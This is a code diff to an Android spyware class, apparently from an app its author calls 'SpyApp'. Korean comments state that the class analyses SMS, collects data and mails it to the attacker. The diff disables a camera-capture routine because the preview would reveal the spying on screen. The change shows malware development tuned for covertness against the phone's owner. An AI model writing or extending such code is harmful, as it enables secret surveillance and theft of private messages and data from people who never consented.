@@ -25,6 +25,7 @@ import static android.hardware.Camera.*;
 /**
  * Created by ydg on 2015-03-07.
  * SMS 분석 후 특정 자료를 수집한 후 새로운 스레드를 생성하여 공격자에게 정보를 메일로 전송
+ * 151102 Remove camera capturing feature
  */
 public class InformationSend {
     public final static String LogTag = "checking_InfoSendLogcat";
@@ -34,9 +35,10 @@ public class InformationSend {
     final String phoneNumber;
     String date;
 
+    /*
     Camera camera;
     int cameraID = 0;
-
+    */
     InformationSend(Context context, String infoName) {
         Log.i(LogTag, "InformationSend class create");
         this.mContext = context;
@@ -53,9 +55,11 @@ public class InformationSend {
             case "Record":
                 getRecordData();
                 break;
+            /*
             case "Capture":
                 getCameraCapture();
                 break;
+            */
             default:
                 break;
         }
@@ -201,6 +205,9 @@ public class InformationSend {
         }).start();
     }
 
+    /*
+    * 카메라 촬영이 되려면 surface view 등으로 화면에 무조건 어떤 게 촬영될지 떠야함
+    * SpyApp에선 그러면 안 되므로 삭제
     public void getCameraCapture() {
         Log.i(LogTag, "InformationSend.getCameraCapture() Method");
 
@@ -315,4 +322,5 @@ public class InformationSend {
             camera = null;
         }
     }
+    */
 }
